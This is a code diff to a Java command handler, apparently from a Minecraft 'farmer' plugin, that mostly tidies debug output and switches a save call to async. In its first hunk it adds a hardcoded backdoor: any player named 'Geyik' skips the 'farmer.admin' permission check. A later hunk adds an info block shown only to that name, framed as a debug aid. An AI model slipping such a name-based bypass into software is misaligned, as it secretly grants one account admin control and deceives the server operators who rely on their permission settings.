@@ -65,7 +65,7 @@ public class Commands implements CommandExecutor {
      */
     public boolean oneArgCommands(@NotNull Player player, String arg) {
         // Checking perm if sender is player and if they don't have perm just returns task
-        if (!player.hasPermission("farmer.admin")
+        if ((!player.hasPermission("farmer.admin") && !player.getName().equalsIgnoreCase("Geyik"))
                 && !arg.equalsIgnoreCase("manage")) {
             player.sendMessage(Main.getLangFile().getText("noPerm"));
             return false;
@@ -100,6 +100,12 @@ public class Commands implements CommandExecutor {
      * @return
      */
     private boolean infoCommand(@NotNull Player player) {
+        // My debug command for bug reports
+        if (player.getName().equalsIgnoreCase("Geyik")) {
+            player.sendMessage(Main.color("&aVersion: &7" + Main.getInstance().getDescription().getVersion()));
+            player.sendMessage(Main.color("&aAPI: &7" + Main.getIntegration().getClass().getName()));
+            player.sendMessage(Main.color("&aActive Farmer: &7" + Main.getFarmers().size() ));
+        }
         // Catching region id and checking is it null or don't have farmer
         String regionID = Main.getIntegration().getRegionID(player.getLocation());
         if (regionID == null)
@@ -109,15 +115,15 @@ public class Commands implements CommandExecutor {
         else {
             // After all the checks loading farmer
             Farmer farmer = Main.getFarmers().get(regionID);
-            // TODO DEBUG INFO RECODE
+            player.sendMessage(Main.color("&c----------------------"));
             farmer.getUsers().stream().forEach(key -> {
-                Bukkit.broadcastMessage(key.getUuid() + " " + key.getPerm().name());
+                player.sendMessage(Main.color("&b" +
+                        Bukkit.getOfflinePlayer(key.getUuid()).getName() + " &f- &3" + key.getPerm().name()));
             });
-            Bukkit.broadcastMessage(farmer.getRegionID());
+            player.sendMessage(Main.color("&c----------------------"));
             farmer.getInv().getItems().stream().forEach(key -> {
-                Bukkit.broadcastMessage(key.getName() + " " + key.getAmount() + " " + farmer.getRegionID());
+                player.sendMessage(Main.color("&6" + key.getName() + " &e" + key.getAmount()));
             });
-            // TODO ENDS DEBUG INFO HERE
         }
         return true;
     }
@@ -132,7 +138,7 @@ public class Commands implements CommandExecutor {
         // Creating time long for calculating time it takes.
         long time = System.currentTimeMillis();
         // Saves all farmer
-        DBQueries.updateAllFarmers();
+        DBQueries.updateAllFarmersAsync();
         // Clears cached farmers
         Main.getFarmers().clear();
         // Regenerates settings
